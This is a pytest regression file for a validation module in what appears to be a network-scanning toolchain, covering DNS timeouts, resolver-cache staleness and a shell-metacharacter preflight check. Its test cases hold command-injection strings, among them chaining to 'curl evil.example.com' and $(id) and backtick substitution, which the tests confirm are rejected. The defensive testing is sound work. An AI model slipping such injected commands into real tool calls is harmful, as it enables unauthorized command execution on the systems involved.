"""P2 regression: bounded DNS, resolve-cache staleness, preflight negatives.

Read-only against ``tools/validation_utils.py`` — no source edits here.

NOTE on the task brief: item 5 says "resolve_target_bounded timeout returns
(None, domain) without raising". Source truth (``validation_utils.py:408``)
plus the existing pins (``test_run_create_startup.py:45``) and the caller
contract (``prepare.py:679`` catches ``TimeoutError`` and maps it to an
actionable ``ValueError``) is that a stalled resolver RAISES ``TimeoutError``.
These tests encode the source contract; the brief line is the discrepancy,
not the code.
"""

from __future__ import annotations

import socket
import time

import pytest

import tools.validation_utils as vu
from tools.validation_utils import preflight_command_check, resolve_target_bounded


# ── Bounded resolve ──────────────────────────────────────────────────────────


def test_bounded_timeout_raises_timeout_error():
    """A stalled resolver raises TimeoutError inside the budget — it never
    blocks the caller for minutes and never silently returns (None, domain),
    which the caller would misread as 'invalid host' instead of 'DNS down'."""

    def _slow_resolver(host):
        time.sleep(5.0)
        return ["93.184.216.34"]  # pragma: no cover - never reached

    start = time.perf_counter()
    with pytest.raises(TimeoutError):
        resolve_target_bounded("slow.test", timeout_seconds=0.2, resolver_fn=_slow_resolver)
    assert time.perf_counter() - start < 5.0


def test_bounded_ip_literal_skips_dns_entirely():
    """IP literals never touch the resolver — even a raising resolver_fn is
    ignored, so a dead DNS cannot break literal-IP runs."""

    def _boom(host):  # pragma: no cover - must never run
        raise AssertionError("resolver must not run for IP literals")

    assert resolve_target_bounded("10.0.0.50", timeout_seconds=1.0, resolver_fn=_boom) == ("10.0.0.50", None)


def test_bounded_invalid_host_returns_none_pair():
    assert resolve_target_bounded("not a domain", timeout_seconds=1.0) == (None, None)
    assert resolve_target_bounded("", timeout_seconds=1.0) == (None, None)


# ── System-resolver cache: stale entries served, expiry re-resolves ──────────


def test_system_resolver_caches_within_ttl(monkeypatch):
    """Second lookup inside the TTL serves the cached address without calling
    the system resolver again."""
    monkeypatch.setattr(vu, "_RESOLVE_CACHE", {})

    calls: list[str] = []
    monkeypatch.setattr(vu, "_resolve_via_system", lambda host, family: calls.append(host) or "10.9.9.9")

    assert vu.resolve_target_to_ip("cache-probe.test") == "10.9.9.9"
    monkeypatch.setattr(vu, "_resolve_via_system", lambda host, family: "10.10.10.10")
    assert vu.resolve_target_to_ip("cache-probe.test") == "10.9.9.9"  # stale, by design
    assert calls == ["cache-probe.test"]


def test_stale_cache_entry_re_resolves(monkeypatch):
    """An entry older than the TTL is re-resolved instead of served stale."""
    monkeypatch.setattr(vu, "_RESOLVE_CACHE", {})
    monkeypatch.setattr(vu, "_resolve_via_system", lambda host, family: "10.10.10.10")

    key = ("cache-probe.test", socket.AF_INET)
    vu._RESOLVE_CACHE[key] = (time.monotonic() - 400.0, "10.9.9.9")  # older than _RESOLVE_TTL_S
    assert vu.resolve_target_to_ip("cache-probe.test") == "10.10.10.10"


def test_injected_resolver_bypasses_cache(monkeypatch):
    """Test-injected resolvers never populate the cache, so tests stay
    deterministic regardless of call order."""
    monkeypatch.setattr(vu, "_RESOLVE_CACHE", {})
    assert vu.resolve_target_to_ip("cache-probe.test", resolver_fn=lambda h: ["1.1.1.1"]) == "1.1.1.1"
    assert vu.resolve_target_to_ip("cache-probe.test", resolver_fn=lambda h: ["2.2.2.2"]) == "2.2.2.2"
    assert vu._RESOLVE_CACHE == {}


# ── Preflight shell-metacharacter negatives ──────────────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        "nmap -sV 10.0.0.5; curl evil.example.com",  # command chaining
        "nmap -sV 10.0.0.5 | tee /tmp/out",  # pipe-out
        "nmap -sV 10.0.0.5 && echo done",  # and-chain (contains &)
        "nmap -sV 10.0.0.5 `id`",  # backtick substitution
        "nmap -sV 10.0.0.5 $(id)",  # dollar substitution
        "nmap -sV 10.0.0.5 > /tmp/out",  # redirect
        "nmap -sV 10.0.0.5\nid",  # embedded newline
    ],
)
def test_preflight_rejects_shell_metachars(command):
    out = preflight_command_check(command, reject_shell_metachars=True)
    assert out["valid"] is False
    assert out["blocked_reason"] is not None


def test_preflight_reject_mode_allows_clean_command():
    out = preflight_command_check("nmap -sV 10.0.0.5", reject_shell_metachars=True)
    assert out["valid"] is True
    assert out["blocked_reason"] is None


def test_preflight_default_mode_allows_pipes():
    """Attack-mode tools legitimately chain/pipe: the default gate is the
    target-IP allowlist lock, not command-content inspection."""
    out = preflight_command_check("nmap -sV 10.0.0.5 | grep open")
    assert out["valid"] is True


def test_preflight_empty_command_invalid():
    out = preflight_command_check("   ", reject_shell_metachars=True)
    assert out["valid"] is False
    assert out["blocked_reason"] == "Empty command."
